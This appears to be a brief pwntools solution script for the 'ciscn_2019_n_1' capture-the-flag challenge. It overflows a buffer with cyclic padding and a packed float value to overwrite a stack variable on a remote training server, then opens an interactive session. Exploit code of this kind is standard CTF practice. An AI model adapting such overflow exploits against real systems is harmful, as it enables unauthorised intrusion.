from pwn import *
io = remote('node4.buuoj.cn',26208)
#io = process('./ciscn_2019_n_1')

payload = cyclic(0x30-0x4) + p64(0x41348000)

io.recv()
io.send(payload)
io.interactive()
